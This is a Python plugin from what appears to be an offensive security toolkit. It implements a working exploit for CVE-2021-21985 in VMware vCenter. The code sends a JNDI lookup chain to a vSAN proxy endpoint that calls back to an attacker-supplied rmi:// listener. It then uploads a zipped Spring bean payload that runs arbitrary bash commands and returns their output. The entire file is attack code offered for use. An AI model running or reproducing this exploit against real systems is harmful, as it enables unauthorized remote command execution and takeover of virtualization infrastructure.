import argparse
from base64 import b64encode
from copy import copy
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED

from requests import Session

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterCVE_2021_21985(PluginVCenterBase):
    display = "CVE-2021-21985"
    alias = "cve_2021_21985"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", required=True, dest="address")
        parser.add_argument("-l", "--listen-ip", help="listener ip", required=True, dest="listen_ip")
        parser.add_argument("-p", "--listen-port", help="listener port", required=True, dest="listen_port")
        parser.add_argument("-c", "--command", help="command to execute", required=False, default="whoami", dest="command")

        parser.add_argument("--proxy", help="proxy", dest="proxy")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)
        ip = args.address
        jndi = f'rmi://{args.listen_ip}:{args.listen_port}/exp'
        # jndi = config.get('jndi')

        vul_path = '/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService'
        endpoints = ["/setTargetObject",
                     "/setStaticMethod",
                     "/setTargetMethod",
                     "/setArguments",
                     "/prepare",
                     "/invoke"]
        params = [{"methodInput": [None]},
                  {"methodInput": ["javax.naming.InitialContext.doLookup"]},
                  {"methodInput": ["doLookup"]},
                  {"methodInput": [[jndi]]},
                  {"methodInput": []},
                  {"methodInput": []}]
        with Session() as s1:
            s1.verify = False
            s1.proxies = args.proxy
            for endpoint, param in zip(endpoints, params):
                try:
                    r = s1.post(f'https://{ip}{vul_path}{endpoint}',
                                json=param, timeout=2)
                    output.info(f"{endpoint}: {r.text}")
                except Exception as e:
                    output.error(f'error: {e}')

        cmd = args.command
        endpoint1 = '/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages'
        endpoint2 = '/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty'
        arcname = 'offline_bundle.xml'
        context = """<beans xmlns="http://www.springframework.org/schema/beans"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="
                 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
                <bean id="pb" class="java.lang.ProcessBuilder">
                    <constructor-arg>
                      <list>
                        <value>/bin/bash</value>
                        <value>-c</value>
                        <value><![CDATA[ {cmd} 2>&1 ]]></value>
                      </list>
                    </constructor-arg>
                </bean>
                <bean id="is" class="java.io.InputStreamReader">
                    <constructor-arg>
                        <value>#{pb.start().getInputStream()}</value>
                    </constructor-arg>
                </bean>
                <bean id="br" class="java.io.BufferedReader">
                    <constructor-arg>
                        <value>#{is}</value>
                    </constructor-arg>
                </bean>
                <bean id="collectors" class="java.util.stream.Collectors"></bean>
                <bean id="system" class="java.lang.System">
                    <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
                </bean>
            </beans>
            """.replace("{cmd}", cmd)
        fp = BytesIO()
        with ZipFile(fp, 'w', ZIP_DEFLATED) as f:
            f.writestr(arcname, context)

        with Session() as s:
            s.verify = False
            # s.proxies = {'https':'http://127.0.0.1:8080'}
            # step 1
            try:
                s.post(
                    f'https://{ip}' + endpoint1,
                    json={
                        "methodInput": [
                            [
                                'https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,{}%23'.format(
                                    b64encode(fp.getvalue()).decode())]
                        ]})

                # step 2
                r = s.post(
                    f'https://{ip}' + endpoint2,
                    json={"methodInput": ["output", None]}
                )
                output.info(r.json().get('result'))
            except Exception as e:
                output.error(f'error: {e}')
        return result
